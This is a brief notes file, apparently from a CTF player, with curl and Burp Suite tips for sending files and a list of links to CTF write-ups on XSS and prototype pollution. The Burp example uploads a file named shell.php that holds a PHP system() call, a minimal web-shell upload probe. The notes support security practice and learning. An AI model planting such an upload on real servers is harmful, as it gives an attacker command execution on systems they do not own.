# Tips for Using Tools

## CURL
Send file với curl: `curl https://example.com/ -F 'f=@<path>/a.txt'`

## Burpsuite
Send file:
```s
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 211

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="f"; filename="shell.php"
Content-Type: text/plain

<?php echo system('uptime'); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```




XSS qua Unicode Normalization vulnerability
https://hnd3884.github.io/posts/Chainreaction-DownUnderCTF-2021/

Challs prototype pollution:
https://ctftime.org/writeup/16201
https://ctftime.org/writeup/27883
https://sekai.team/blog/dice-ctf-2022/vm-calc/
https://ctf.zeyu2001.com/2022/tetctf-2022/animals
https://ctftime.org/writeup/35154
https://hackmd.io/@d4rkp0w4r/SnykCon-CTF-2021
https://www.akamai.com/blog/security/northsec-ctf-2021-write-up-impurity-assessment-form
https://cyberlances.wordpress.com/2021/07/15/redpwnctf-web-challenge-writeup-part-2/?fbclid=IwAR3ZLCGBM1GvOiu1vgAt2Eev1r1QynKp12L5o6MO0vIVBlucIrNs-gWQJ_A